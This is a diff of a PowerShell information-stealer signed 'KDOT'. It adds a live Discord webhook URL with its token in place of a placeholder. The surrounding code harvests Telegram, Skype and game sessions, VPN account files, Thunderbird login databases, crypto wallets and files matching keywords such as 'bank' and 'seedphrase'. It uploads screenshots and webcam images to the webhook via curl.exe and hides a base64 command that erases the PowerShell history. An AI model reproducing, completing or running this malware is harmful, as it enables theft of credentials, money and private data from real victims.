@@ -28,7 +28,7 @@ function KDMUTEX {
 
 Add-Type -AssemblyName PresentationCore, PresentationFramework
 
-$webhook = "YOUR_WEBHOOK_HERE"
+$webhook = "https://discord.com/api/webhooks/1227449757845159997/yF8mX-lM3516Ow9eIMBTTZo0D1qRa92HUpRKuGgGo0Adh7mlIdOPXHzw1JLB0vQ88HqW"
 $avatar = "https://i.postimg.cc/k58gQ03t/PTG.gif"
 
 
@@ -378,7 +378,8 @@ function Backup-Data {
         }
     }
     Get-ProductKey > $folder_general\productkey.txt
-	
+
+
     # All Messaging Sessions
     function telegramstealer {
         $processname = "telegram"
@@ -481,7 +482,7 @@ function Backup-Data {
             }
         }
     }
-	
+
     function skype_stealer {
         $processname = "skype"
         $skypefolder = "$env:appdata\microsoft\skype for desktop"
@@ -566,7 +567,7 @@ function Backup-Data {
         New-Item -ItemType Directory -Force -Path $growtopia_session
         Copy-Item -Path "$growtopiafolder\save.dat" -Destination $growtopia_session -Recurse -force
     }
-    
+
     function battle_net_stealer {
         $processnames = @("Battle.net", "Agent")
         $battle_folder = "$env:appdata\Battle.net"
@@ -579,7 +580,8 @@ function Backup-Data {
             Copy-Item -Path $file.FullName -Destination $battle_session
         }
     }
-	
+
+
     # All VPN Sessions
 
     # NordVPN 
@@ -604,8 +606,8 @@ function Backup-Data {
         Copy-Item -Path "$nordvpnfolder\ProfileOptimization" -Destination $nordvpn_account -Recurse -force   
         Copy-Item -Path "$nordvpnfolder\libmoose.db" -Destination $nordvpn_account -Recurse -force
     }
-    
-	
+
+
     # ProtonVPN
     function protonvpnstealer {
         $processname = "protonvpn"
@@ -627,8 +629,8 @@ function Backup-Data {
         }
         Copy-Item -Path "$protonvpnfolder\Startup.profile" -Destination $protonvpn_account -Recurse -force
     }
-    
-	
+
+
     #Surfshark VPN
     function surfsharkvpnstealer {
         $processname = "Surfshark"
@@ -639,8 +641,8 @@ function Backup-Data {
         New-Item -ItemType Directory -Force -Path $surfsharkvpn_account
         Get-ChildItem $surfsharkvpnfolder -Include @("data.dat", "settings.dat", "settings-log.dat", "private_settings.dat") -Recurse | Copy-Item -Destination $surfsharkvpn_account
     }
-    
-	
+
+
     function Export-Data_Sessions {		
         telegramstealer
         elementstealer
@@ -661,25 +663,23 @@ function Backup-Data {
         surfsharkvpnstealer		
     }
     Export-Data_Sessions
-	
+
     # Thunderbird Exfil
     If (Test-Path -Path "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles") {
         $Thunderbird = @('key4.db', 'key3.db', 'logins.json', 'cert9.db')
         New-Item -Path "$folder_email\Thunderbird" -ItemType Directory | Out-Null
         Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles" -Include $Thunderbird -Recurse | Copy-Item -Destination "$folder_email\Thunderbird" -Recurse -Force
     }
-	
+
     function Invoke-Crypto_Wallets {
         If (Test-Path -Path "$env:userprofile\AppData\Roaming\Armory") {
             New-Item -Path "$folder_crypto\Armory" -ItemType Directory | Out-Null
             Get-ChildItem "$env:userprofile\AppData\Roaming\Armory" -Recurse | Copy-Item -Destination "$folder_crypto\Armory" -Recurse -Force
         }
-    
         If (Test-Path -Path "$env:userprofile\AppData\Roaming\Atomic") {
             New-Item -Path "$folder_crypto\Atomic" -ItemType Directory | Out-Null
             Get-ChildItem "$env:userprofile\AppData\Roaming\Atomic\Local Storage\leveldb" -Recurse | Copy-Item -Destination "$folder_crypto\Atomic" -Recurse -Force
         }
-    
         If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin") {
             New-Item -Path "$folder_crypto\BitcoinCore" -ItemType Directory | Out-Null
             Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin\Bitcoin-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$folder_crypto\BitcoinCore" -Recurse -Force
@@ -797,29 +797,29 @@ function Backup-Data {
         curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$env:APPDATA\KDOT\$name\`"" $webhook | out-null
         Remove-Item -Path "$env:APPDATA\KDOT\$name" -Force
     }
-    
+
     # Works since most victims will have a weak password which can be bruteforced
-    function ExportPrivateKeys {
-        $privatekeysfolder = "$important_files\Certificates & Private Keys"
-        New-Item -ItemType Directory -Path $privatekeysfolder -Force
-        $sourceDirectory = "$env:userprofile"
-        $destinationDirectory = "$important_files\Certificates & Private Keys"
-        $fileExtensions = @("*.pem", "*.ppk", "*.key", "*.pfx")
-        $foundFiles = Get-ChildItem -Path $sourceDirectory -Recurse -Include $fileExtensions -File
-        foreach ($file in $foundFiles) {
-            Copy-Item -Path $file.FullName -Destination $destinationDirectory -Force
-        }
-    }
-    ExportPrivateKeys
+    #function ExportPrivateKeys {
+    #    $privatekeysfolder = "$important_files\Certificates & Private Keys"
+    #    New-Item -ItemType Directory -Path $privatekeysfolder -Force
+    #    $sourceDirectory = "$env:userprofile"
+    #    $destinationDirectory = "$important_files\Certificates & Private Keys"
+    #    $fileExtensions = @("*.pem", "*.ppk", "*.key", "*.pfx")
+    #    $foundFiles = Get-ChildItem -Path $sourceDirectory -Recurse -Include $fileExtensions -File
+    #    foreach ($file in $foundFiles) {
+    #        Copy-Item -Path $file.FullName -Destination $destinationDirectory -Force
+    #    }
+    #}
+    #ExportPrivateKeys
 	
-  Function Invoke-GrabFiles {
+    Function Invoke-GrabFiles {
         $grabber = @(
             "2fa",
             "acc",
             "atomic wallet",
             "account",
             "backup",
-	    "bank",
+            "bank",
             "bitcoin",
             "backupcode",
             "bitwarden",
@@ -835,7 +835,7 @@ function Backup-Data {
             "exodus",
             "facebook",
             "fb",
-	    "funds",
+            "funds",
             "keepass",
             "keepassxc",
             "keys",
@@ -853,7 +853,7 @@ function Backup-Data {
             "recovery",
             "remote",
             "secret",
-	    "passphrase",
+            "passphrase",
             "seedphrase",
             "wallet seed",
             "server",
@@ -901,7 +901,7 @@ function Backup-Data {
 
     $main_temp = "$env:localappdata\temp"
     $avatar = "https://i.postimg.cc/k58gQ03t/PTG.gif"
-	
+
     Add-Type -AssemblyName System.Windows.Forms, System.Drawing
     $screens = [Windows.Forms.Screen]::AllScreens
     $top = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
@@ -915,10 +915,10 @@ function Backup-Data {
     $bmp.Save("$main_temp\screenshot.png")
     $graphics.Dispose()
     $bmp.Dispose()
-	
+
     curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"KDOT\`", \`"content\`": \`"# :desktop: Screenshot\n\n\`"}" -F "file=@\`"$main_temp\screenshot.png\`"" "$($webhook)" | Out-Null
 
-    
+
     Move-Item "$main_temp\discord.json" $folder_general -Force	
     Move-Item "$main_temp\screenshot.png" $folder_general -Force
     Move-Item -Path "$main_temp\autofill.json" -Destination "$browser_data" -Force
@@ -978,6 +978,8 @@ if (INVOKE-AC -eq $true) {
     else {
         [ProcessUtility]::MakeProcessKillable()
     }
+    $script:SingleInstanceEvent.Close()
+    $script:SingleInstanceEvent.Dispose()
     I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
 }
 else {
